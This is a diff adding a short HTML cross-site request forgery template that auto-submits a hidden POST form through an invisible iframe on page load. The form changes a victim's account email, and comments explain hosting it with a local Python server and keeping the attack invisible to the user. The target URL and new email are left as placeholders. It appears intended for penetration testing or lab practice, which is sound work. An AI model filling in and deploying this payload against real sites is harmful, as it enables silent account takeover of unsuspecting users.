@@ -1,0 +1,15 @@
+<!-- iframe helps keep attack invisimble to the user -->
+<!-- to host, launch a python server -->
+<!-- python -m http.server 5555 -->
+<!-- http://127.0.0.1:5555/csrf_template.html -->
+<html>
+    <body>
+        <h1>Hello World!</h1>
+        <iframe style="display:none" name="csrf-iframe"></iframe>
+        <form action="ADD REQUEST URL HERE" method="POST" target="csrf-iframe" id="csrf-form">
+            <input type="hidden" name="email" value="AND NEW EMAIL HERE">
+        </form>
+
+        <script>document.getElementById("csrf-form").submit()</script>
+    </body>
+</html>
